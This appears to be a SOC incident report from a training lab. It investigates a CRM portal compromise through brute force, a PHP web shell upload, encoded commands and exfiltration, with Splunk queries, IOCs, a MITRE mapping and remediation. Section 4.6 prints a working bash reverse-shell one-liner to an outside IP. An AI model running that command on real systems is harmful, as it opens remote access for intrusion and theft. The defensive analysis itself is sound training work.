
---

# 🛡️ SOC Incident Report – Portal Drop (CRM Web Compromise)

---

## 1️⃣ Incident Overview

**Incident Name:** Portal Drop
**Customer:** TryPatchMe – CRM Portal (`crm.trypatchme.thm`)
**Date of Incident:** 2025-11-06
**Detection Source:** WAF Alert + EDR Console
**Incident Type:** Web Shell Upload → Remote Command Execution → Data Exfiltration
**Severity:** High

---

## 2️⃣ Executive Summary

During routine SOC monitoring, a WAF alert indicated abnormal activity against the public-facing CRM portal. Investigation of web access logs revealed a brute-force login attempt originating from a single IP address.

Following the brute force, the attacker uploaded a malicious PHP file (`invoice.php`) into the application uploads directory. This file acted as a web shell and allowed remote command execution.

The attacker executed encoded commands, established a reverse shell, accessed sensitive configuration files, and exfiltrated CRM data to an external domain.

The incident represents a full web application compromise.

---

## 3️⃣ Timeline of Events (UTC)

| Time          | Event                                               |
| ------------- | --------------------------------------------------- |
| 14:17         | Brute force login attempts begin                    |
| 14:27:34      | First invocation of uploaded script (`invoice.php`) |
| 14:28         | Suspicious file write detected by EDR               |
| 14:28         | Encoded command execution observed                  |
| 14:34         | Sensitive file `/etc/trycrm/config.json` accessed   |
| Shortly after | Reverse shell established                           |
| Later         | Database exfiltration to external domain            |

---

## 4️⃣ Investigation Details

### 🔹 4.1 Attacker IP Identification

Query used:

```spl
source="access-combined-crm-*.log" 
| stats count by clientip 
| sort -count
```

**Malicious IP Identified:**
`34.67.91.83`

**Why suspicious?**

* Highest volume of POST requests
* Conducted brute force attempts
* Uploaded malicious file
* Invoked web shell

---

### 🔹 4.2 Brute Force Activity

Query:

```spl
source="access-combined-crm-*.log" "login.php" 
| stats count by status
```

**Results:**

* 18 successful logins (HTTP 200)
* 35 failed logins (HTTP 401)

This confirms automated credential brute forcing.

---

### 🔹 4.3 Malicious File Upload

The attacker uploaded:

```
invoice.php
```

Upload endpoint:

```
/CRM/portal/upload.php
```

Subsequent invocation:

```
/CRM/portal/uploads/invoice.php
```

User-Agent used:

```
python-requests/2.31.0
```

This strongly indicates scripted automation.

---

### 🔹 4.4 Web Shell Command Execution

The web shell used a query parameter:

```
q=<base64_encoded_value>
```

After decoding twice using Base64, the first decoded command was:

```
whoami
```

This confirms successful remote command execution.

---

### 🔹 4.5 Process Responsible for Execution

EDR telemetry identified:

```
Process Image: /usr/sbin/php-fpm7.4
User: www-data
```

The web server process executed attacker-supplied commands.

---

### 🔹 4.6 Reverse Shell

The attacker executed:

```
bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
```

This established an interactive reverse shell connection to the remote host.

---

### 🔹 4.7 Sensitive File Access

The attacker accessed:

```
/etc/trycrm/config.json
```

This file likely contains:

* Database credentials
* API keys
* Application secrets

---

### 🔹 4.8 Data Exfiltration

Exfiltration domain identified:

```
portaldrop2025.xyz
```

This indicates successful outbound data transfer.

---

## 5️⃣ Indicators of Compromise (IOCs)

| Type                    | Value                                        |
| ----------------------- | -------------------------------------------- |
| Attacker IP             | 34.67.91.83                                  |
| User-Agent              | python-requests/2.31.0                       |
| Malicious File          | invoice.php                                  |
| Web Shell Path          | /var/www/html/CRM/portal/uploads/invoice.php |
| Executing Process       | /usr/sbin/php-fpm7.4                         |
| Linux User              | www-data                                     |
| Reverse Shell IP        | 115.58.148.86                                |
| Reverse Shell Port      | 8080                                         |
| Exfiltration Domain     | portaldrop2025.xyz                           |
| Sensitive File Accessed | /etc/trycrm/config.json                      |

---

## 6️⃣ MITRE ATT&CK Mapping

| Tactic            | Technique                             | ID        |
| ----------------- | ------------------------------------- | --------- |
| Initial Access    | Brute Force                           | T1110     |
| Execution         | Server Software Component (Web Shell) | T1505.003 |
| Command & Control | Application Layer Protocol (HTTP)     | T1071.001 |
| Discovery         | System Information Discovery          | T1082     |
| Exfiltration      | Exfiltration Over C2 Channel          | T1041     |

---

## 7️⃣ Root Cause Analysis

The CRM portal allowed unrestricted file uploads without proper validation or filtering. This allowed the attacker to upload a PHP web shell.

Lack of:

* File type validation
* Web application firewall restrictions
* Brute force protection
* Rate limiting

contributed to the compromise.

---

## 8️⃣ Impact Assessment

* Remote command execution achieved
* Reverse shell established
* Sensitive configuration accessed
* Database likely exfiltrated
* Full application compromise

Severity: **High**

---

## 9️⃣ Containment & Remediation

### Immediate Actions

* Remove malicious file (`invoice.php`)
* Block attacker IP at firewall/WAF
* Disable compromised credentials
* Isolate CRM host

### Long-Term Fixes

* Enforce file type validation
* Disable PHP execution in uploads directory
* Implement brute force protection
* Enable rate limiting
* Rotate all credentials
* Monitor outbound traffic

---

## 🔟 Conclusion

The attacker successfully exploited weak upload validation to deploy a PHP web shell, executed remote commands, established persistence via interactive shell access, and exfiltrated sensitive CRM data.

The incident highlights the critical importance of secure file handling, monitoring of abnormal POST activity, and EDR visibility into web server processes.

